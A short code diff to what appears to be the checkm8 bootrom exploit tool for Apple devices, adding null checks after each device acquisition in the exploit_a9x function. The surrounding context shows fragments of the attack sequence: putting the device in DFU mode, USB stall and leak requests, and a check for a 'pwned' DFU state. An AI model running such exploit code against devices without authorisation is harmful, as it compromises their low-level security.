@@ -879,8 +879,9 @@ def exploit_a8_a9(match=None):
 
 def exploit_a9x(match: None = None) -> None:
     print("*** checkm8 exploit by axi0mX ***")
-
+    
     device = dfu.acquire_device(match=match)
+    assert device
     start = time.time()
     print("Found:", device.serial_number)
     if "PWND:[" in device.serial_number:
@@ -922,6 +923,8 @@ def exploit_a9x(match: None = None) -> None:
     time.sleep(0.5)
 
     device = dfu.acquire_device(match=match)
+    assert device
+
     usbutil.usb_req_stall(device)
     for _ in range(16):
         usbutil.usb_req_leak(device)
@@ -934,6 +937,8 @@ def exploit_a9x(match: None = None) -> None:
     dfu.release_device(device)
 
     device = dfu.acquire_device(match=match)
+    assert device
+
     if "PWND:[checkm8]" not in device.serial_number:
         print("ERROR: Exploit failed. Device did not enter pwned DFU Mode.")
         sys.exit(1)
